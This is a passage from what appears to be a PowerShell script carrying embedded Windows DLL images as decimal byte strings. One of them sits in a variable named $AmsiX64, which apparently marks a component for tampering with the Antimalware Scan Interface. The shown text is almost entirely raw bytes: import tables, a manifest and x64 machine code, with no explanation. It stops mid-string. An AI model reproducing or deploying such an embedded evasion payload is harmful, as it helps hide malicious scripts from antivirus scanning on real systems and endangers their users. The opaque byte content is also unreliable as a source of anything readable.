255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" $AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 